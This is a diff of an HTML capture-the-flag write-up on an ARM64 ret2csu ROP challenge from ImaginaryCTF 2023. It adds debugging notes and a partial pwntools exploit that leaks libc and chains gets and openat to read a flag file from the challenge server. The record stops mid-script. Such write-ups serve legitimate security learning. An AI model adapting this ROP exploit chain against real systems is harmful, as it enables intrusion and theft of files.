@@ -8,11 +8,11 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>[imaginary-ctf-2023] [pwn] generic-rop-challenge &middot; My Average Blog</title>
-  <meta name="title" content="[imaginary-ctf-2023] [pwn] generic-rop-challenge &middot; My Average Blog" />
+  <title>generic-rop-challenge &middot; d0UBleW&#39;s Blog</title>
+  <meta name="title" content="generic-rop-challenge &middot; d0UBleW&#39;s Blog" />
   
-  <meta name="description" content="ARM64 ROP" />
-  <meta name="keywords" content="arm, rop, " />
+  <meta name="description" content="ARM64 ROP with `ret2csu`" />
+  <meta name="keywords" content="ARM64, ROP, " />
   
   
   <link rel="canonical" href="https://d0ublew.github.io/posts/imaginaryctf-2023/pwn/generic-rop-challenge/" />
@@ -61,32 +61,32 @@
   
   
   
-  <meta property="og:title" content="[imaginary-ctf-2023] [pwn] generic-rop-challenge" />
-<meta property="og:description" content="ARM64 ROP" />
+  <meta property="og:title" content="generic-rop-challenge" />
+<meta property="og:description" content="ARM64 ROP with ret2csu" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://d0ublew.github.io/posts/imaginaryctf-2023/pwn/generic-rop-challenge/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2023-07-25T00:00:00+00:00" />
-<meta property="article:modified_time" content="2023-07-25T00:00:00+00:00" /><meta property="og:site_name" content="My Average Blog" />
+<meta property="article:modified_time" content="2023-07-25T00:00:00+00:00" /><meta property="og:site_name" content="d0UBleW&#39;s Blog" />
 
   <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="[imaginary-ctf-2023] [pwn] generic-rop-challenge"/>
-<meta name="twitter:description" content="ARM64 ROP"/>
+<meta name="twitter:title" content="generic-rop-challenge"/>
+<meta name="twitter:description" content="ARM64 ROP with ret2csu"/>
 
   
   <script type="application/ld+json">
   [{
     "@context": "https://schema.org",
     "@type": "Article",
-    "articleSection": "Welcome to my blog",
-    "name": "[imaginary-ctf-2023] [pwn] generic-rop-challenge",
-    "headline": "[imaginary-ctf-2023] [pwn] generic-rop-challenge",
+    "articleSection": "My Average Blog",
+    "name": "generic-rop-challenge",
+    "headline": "generic-rop-challenge",
     
-    "abstract": "ARM64 ROP",
+    "abstract": "ARM64 ROP with \u003ccode\u003eret2csu\u003c\/code\u003e",
     "inLanguage": "en",
     "url" : "https:\/\/d0ublew.github.io\/posts\/imaginaryctf-2023\/pwn\/generic-rop-challenge\/",
     "author" : {
       "@type": "Person",
-      "name": "William Wijaya"
+      "name": "d0UBleW"
     },
     "copyrightYear": "2023",
     "dateCreated": "2023-07-25T00:00:00\u002b00:00",
@@ -94,27 +94,27 @@
     
     "dateModified": "2023-07-25T00:00:00\u002b00:00",
     
-    "keywords": ["arm","rop"],
+    "keywords": ["ARM64","ROP"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "273"
+    "wordCount": "658"
   }]
   </script>
 
 
   
   
-  <meta name="author" content="William Wijaya" />
+  <meta name="author" content="d0UBleW" />
   
-  
-  
-  <link href="mailto:d0ublew@duck.com" rel="me" />
   
   
   <link href="https://github.com/d0UBleW" rel="me" />
   
   
   <link href="https://linkedin.com/in/williamwijaya02" rel="me" />
+  
+  
+  <link href="mailto:d0ublew@duck.com" rel="me" />
   
   
   
@@ -166,7 +166,7 @@
     <div class="flex flex-1 items-center justify-between">
         <nav class="flex space-x-3">
 
-            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">My Average Blog</a>
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">d0UBleW&rsquo;s Blog</a>
 
 
         </nav>
@@ -177,8 +177,18 @@
             
   <a href="/posts/"  class="flex items-center">
     
-    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="Welcome to my blog">
-        Blog
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="My Average Blog">
+        Posts
+    </p>
+</a>
+
+
+            
+            
+  <a href="/tags/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="Tags">
+        Tags
     </p>
 </a>
 
@@ -195,10 +205,10 @@
 
             
             
-  <a href="/tags/"  class="flex items-center">
+  <a href="/about/"  class="flex items-center">
     
-    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="Tags">
-        Tags
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="About">
+        About
     </p>
 </a>
 
@@ -362,8 +372,22 @@
   <li class="mt-1">
     <a href="/posts/"  class="flex items-center">
         
-        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="Welcome to my blog">
-            Blog
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="My Average Blog">
+            Posts
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/tags/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="Tags">
+            Tags
         </p>
     </a>
 </li>
@@ -388,10 +412,10 @@
 
                     
   <li class="mt-1">
-    <a href="/tags/"  class="flex items-center">
+    <a href="/about/"  class="flex items-center">
         
-        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="Tags">
-            Tags
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="About">
+            About
         </p>
     </a>
 </li>
@@ -480,7 +504,7 @@
     <a
       class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
       href="/"
-      >My Average Blog</a
+      >d0UBleW&#39;s Blog</a
     ><span class="px-1 text-primary-500">/</span>
   </li>
 
@@ -489,7 +513,7 @@
     <a
       class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
       href="/posts/"
-      >Welcome to my blog</a
+      >My Average Blog</a
     ><span class="px-1 text-primary-500">/</span>
   </li>
 
@@ -498,7 +522,7 @@
     <a
       class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
       href="/posts/imaginaryctf-2023/pwn/generic-rop-challenge/"
-      >[imaginary-ctf-2023] [pwn] generic-rop-challenge</a
+      >generic-rop-challenge</a
     ><span class="px-1 text-primary-500">/</span>
   </li>
 
@@ -507,7 +531,7 @@
 
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      [imaginary-ctf-2023] [pwn] generic-rop-challenge
+      generic-rop-challenge
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
@@ -550,7 +574,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2023-07-25 00:00:00 &#43;0000 UTC">25 July 2023</time><span class="px-2 text-primary-500">&middot;</span><span>273 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
+  <time datetime="2023-07-25 00:00:00 &#43;0000 UTC">25 July 2023</time><span class="px-2 text-primary-500">&middot;</span><span>658 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
   
 
   
@@ -568,12 +592,12 @@
   
   
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/imaginary-ctf-2023/&#34;,'_self');">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/imaginaryctf-2023/&#34;,'_self');">
     <span class="flex">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
   >
-    imaginary-ctf-2023
+    ImaginaryCTF 2023
   </span>
 </span>
 
@@ -598,12 +622,12 @@
   
   
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/arm/&#34;,'_self');">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/arm64/&#34;,'_self');">
     <span class="flex">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
   >
-    arm
+    ARM64
   </span>
 </span>
 
@@ -614,7 +638,7 @@
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
   >
-    rop
+    ROP
   </span>
 </span>
 
@@ -676,6 +700,7 @@
         </li>
       </ul>
     </li>
+    <li><a href="#solution">Solution</a></li>
   </ul>
 </nav>
   </div>
@@ -703,6 +728,7 @@
         </li>
       </ul>
     </li>
+    <li><a href="#solution">Solution</a></li>
   </ul>
 </nav>
   </div>
@@ -798,9 +824,38 @@
             style="text-decoration-line: none !important;" href="#note" aria-label="Anchor">#</a></span>        
     
 </h2>
-<p>Not sure why it does not work in non-debug mode (GDB)</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">gef-remote --qemu-user localhost <span class="m">1234</span>
-</span></span></code></pre></div><div id="aarch64-arm64" class="anchor"></div>
+
+  
+
+
+
+<div
+  
+    class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"
+  >
+
+  <span
+    
+      class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"
+    >
+
+    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417l-213.3-364c-16.33-28-57.54-28-73.98 0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6C502.1 480 522.6 445 506.3 417zM232 168c0-13.25 10.75-24 24-24S280 154.8 280 168v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zM256 416c-17.36 0-31.44-14.08-31.44-31.44c0-17.36 14.07-31.44 31.44-31.44s31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
+
+  </span>
+
+
+  </span>
+
+  <span
+    
+      class="dark:text-neutral-300"
+    >Not sure why the exploit does not work in non-debug mode locally, but works for local debug-mode and remote non-debug</span>
+</div>
+
+<div id="aarch64-arm64" class="anchor"></div>
 <h2 class="relative group">aarch64 (ARM64) 
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
@@ -819,13 +874,20 @@
 <p>References: <a href="https://docs.pwntools.com/en/stable/qemu.html"   target="_blank">
     https://docs.pwntools.com/en/stable/qemu.html</a></p>
 <ul>
-<li>gdb: <a href="https://github.com/xpack-dev-tools/aarch64-none-elf-gcc-xpack/"   target="_blank">
+<li>gcc toolchain (with gdb): <a href="https://github.com/xpack-dev-tools/aarch64-none-elf-gcc-xpack/"   target="_blank">
     https://github.com/xpack-dev-tools/aarch64-none-elf-gcc-xpack/</a></li>
 <li>qemu: <code>sudo apt-get install qemu-user-static</code></li>
 <li>libs: <code>sudo apt-get install libc6-arm64-cross</code> installs to <code>/usr/aarch64-linux-gnu/</code></li>
 </ul>
-<p>Running qemu: <code>qemu-aarch64-static ./binary</code></p>
-<div id="assembly" class="anchor"></div>
+<p>Running the binary</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1"># non-debug mode</span>
+</span></span><span class="line"><span class="cl">qemu-aarch64-static ./binary
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># debug mode (gdbserver) on port 1234</span>
+</span></span><span class="line"><span class="cl">qemu-aarch64-static -g <span class="m">1234</span> ./binary
+</span></span></code></pre></div><p>Attach debugger with <code>GEF</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">gef➤  gef-remote --qemu-user localhost <span class="m">1234</span>
+</span></span></code></pre></div><div id="assembly" class="anchor"></div>
 <h3 class="relative group">Assembly 
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
@@ -861,7 +923,7 @@
 <li>Add <code>N</code> to <code>sp</code> (<code>sp = sp + N</code>)</li>
 <li>Stores old frame pointer, <code>x29</code>, to <code>[sp]</code> and return address, <code>x30</code>, to <code>[sp + 8]</code></li>
 </ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">stp</span> <span class="no">x29</span><span class="p">,</span> <span class="no">x30</span><span class="p">,</span> <span class="p">[</span><span class="no">sp</span><span class="p">,</span> <span class="c1">#N]!  # pre-indexed [base, #offset]!
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">stp</span> <span class="no">x29</span><span class="p">,</span> <span class="no">x30</span><span class="p">,</span> <span class="p">[</span><span class="no">sp</span><span class="p">,</span> <span class="c1">#N]!  ; pre-indexed [base, #offset]!
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">mov</span> <span class="no">x29</span><span class="p">,</span> <span class="no">sp</span>
 </span></span></code></pre></div><div id="function-epilogue" class="anchor"></div>
 <h4 class="relative group">Function Epilogue 
@@ -871,12 +933,12 @@
             style="text-decoration-line: none !important;" href="#function-epilogue" aria-label="Anchor">#</a></span>        
     
 </h4>
-<p>Post-indexed performs the assembly instruction then offset operation</p>
+<p>Post-indexed performs the assembly instruction then the offset operation</p>
 <ul>
 <li>Load <code>[sp]</code> to <code>x29</code> and <code>[sp + 8]</code> to <code>x30</code></li>
 <li>Add <code>N</code> to <code>sp</code> (<code>sp = sp + N</code>)</li>
 </ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">ldp</span> <span class="no">x29</span><span class="p">,</span> <span class="no">x30</span><span class="p">,</span> <span class="p">[</span><span class="no">sp</span><span class="p">],</span> <span class="c1">#N  # post-indexed [base], #offset
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">ldp</span> <span class="no">x29</span><span class="p">,</span> <span class="no">x30</span><span class="p">,</span> <span class="p">[</span><span class="no">sp</span><span class="p">],</span> <span class="c1">#N  ; post-indexed [base], #offset
 </span></span></span></code></pre></div><div id="stack-layout" class="anchor"></div>
 <h4 class="relative group">Stack Layout 
     <span
@@ -900,7 +962,125 @@
 </span></span><span class="line"><span class="cl">+--------------------------+   Higher memory address
 </span></span></code></pre></div><p>Unlike in <code>x86</code> where saved <code>rbp</code> and <code>rip</code> are below the local variables which allow us to overwrite the saved <code>rip</code> and immediately return to our desired address,
 in <code>ARM64</code> we overwrite the callers&rsquo;s return address instead due to the stack layout which means that we would first return normally to the caller and only then return to our desired address</p>
-
+<div id="solution" class="anchor"></div>
+<h2 class="relative group">Solution 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#solution" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># type: ignore</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># flake8: noqa</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ld</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./ld-linux-aarch64.so.1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./vuln&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">flag_path</span>
+</span></span><span class="line"><span class="cl">    <span class="n">host</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;generic-rop-challenge.chal.imaginaryctf.org&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">42042</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flag_path</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;/home/user/flag.txt</span><span class="se">\x00</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flag_path</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;/run/shm/flag.txt</span><span class="se">\x00</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">qemu</span><span class="p">,</span> <span class="s2">&#34;-g&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">debug_port</span><span class="p">),</span> <span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flag_path</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;/run/shm/flag.txt</span><span class="se">\x00</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">qemu</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="n">env</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">env</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="n">qemu</span> <span class="o">=</span> <span class="s2">&#34;/usr/bin/qemu-aarch64-static&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">debug_port</span> <span class="o">=</span> <span class="mi">1234</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag_path</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pad</span> <span class="o">=</span> <span class="mi">80</span> <span class="o">-</span> <span class="mh">0x10</span>
+</span></span><span class="line"><span class="cl"><span class="n">main_x29</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;BBBBBBBB&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">bss</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">csu_1</span> <span class="o">=</span> <span class="mh">0x400948</span>
+</span></span><span class="line"><span class="cl"><span class="n">csu_2</span> <span class="o">=</span> <span class="mh">0x400928</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">ret2csu</span><span class="p">(</span><span class="n">w0</span><span class="p">,</span> <span class="n">x1</span><span class="p">,</span> <span class="n">x2</span><span class="p">,</span> <span class="n">func_ptr</span><span class="p">,</span> <span class="n">next_gadget</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="n">pad</span> <span class="o">+</span> <span class="n">main_x29</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu_1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="n">bss</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu_2</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>  <span class="c1"># x19, x20</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="n">func_ptr</span><span class="p">,</span> <span class="n">w0</span><span class="p">)</span>  <span class="c1"># x21, x22</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="n">x1</span><span class="p">,</span> <span class="n">x2</span><span class="p">)</span>  <span class="c1"># x23, x24</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="n">bss</span><span class="p">,</span> <span class="n">next_gadget</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Leak LIBC</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">ret2csu</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&#34;puts&#34;</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&#34;puts&#34;</span><span class="p">],</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;main&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;below</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak_puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">keepends</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">leak_puts</span> <span class="o">|=</span> <span class="mh">0x4000000000</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">leak_puts</span><span class="si">=:</span><span class="s2">#x</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak_puts</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;puts&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="si">=:</span><span class="s2">#x</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># gets(bss) // stdin: /home/user/flag.txt</span>
+</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;setup flag path string @ bss + 0x500&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">flag_path</span><span class="si">=}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag_path_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x500</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">ret2csu</span><span class="p">(</span><span class="n">flag_path_addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&#34;gets&#34;</span><span class="p">],</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;main&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;below</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">flag_path</span><span class="p">)</span>  <span class="c1"># absolute path to ignore `dirfd` for `openat`</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># gets(bss) // stdin: libc.symbols[&#34;openat&#34;]</span>
+</span></span><span class="line"><span class="cl"><span class="n">openat_fptr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x600</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;setup openat function pointer @ bss + 0x600&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">ret2csu</span><span class="p">(</span><span class="n">openat_fptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&#34;gets&#34;</span><span class="p">],</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;main&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;below</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;openat&#34;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># fini_ptr = 0x400e20</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># openat(0, flag_path_addr, 0)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;openat(0, flag_path_addr, 0)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">ret2csu</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">flag_path_addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">openat_fptr</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;main&#34;</span><span class="p">])</span>
